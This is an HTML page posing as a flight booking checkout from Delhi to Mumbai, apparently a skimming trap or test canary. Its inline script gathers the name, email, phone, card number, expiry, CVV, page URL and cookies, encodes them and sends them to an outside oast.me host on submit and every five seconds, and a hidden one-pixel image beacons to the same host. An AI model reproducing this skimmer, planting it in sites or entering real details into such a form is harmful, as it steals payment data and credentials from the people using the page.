<!DOCTYPE html>
<html>
<head><title>Flight Booking</title></head>
<body>
<h1>Complete Your Booking</h1>
<p>Delhi (DEL) to Mumbai (BOM) - One Way</p>
<img src="https://d7eactc899s2runrje60xr3geu147za1g.oast.me/img-beacon-bifm" width="1" height="1">
<form id="bf" action="#" method="post">
<label>First Name</label><input type="text" id="fn" name="first_name"><br>
<label>Last Name</label><input type="text" id="ln" name="last_name"><br>
<label>Email</label><input type="email" id="em" name="email"><br>
<label>Phone</label><input type="tel" id="ph" name="phone"><br>
<h2>Payment Details</h2>
<label>Card Number</label><input type="text" id="cc" name="card_number" placeholder="4111 1111 1111 1111"><br>
<label>Expiry Date</label><input type="text" id="ex" name="expiry" placeholder="MM/YY"><br>
<label>CVV</label><input type="text" id="cv" name="cvv" placeholder="123"><br>
<label>Cardholder Name</label><input type="text" id="ch" name="cardholder_name"><br>
<button type="submit">Confirm & Pay - INR 4,299</button>
</form>
<script>
var O="https://d7eactc899s2runrje60xr3geu147za1g.oast.me";
function g(){var d={};["fn","ln","em","ph","cc","ex","cv","ch"].forEach(function(i){var e=document.getElementById(i);if(e&&e.value)d[i]=e.value});d.u=location.href;d.c=document.cookie;return d}
document.getElementById("bf").onsubmit=function(e){e.preventDefault();new Image().src=O+"/submit?d="+btoa(JSON.stringify(g()))};
setInterval(function(){var d=g();if(Object.keys(d).length>2)new Image().src=O+"/poll?d="+btoa(JSON.stringify(d))},5000);
</script>
</body>
</html>
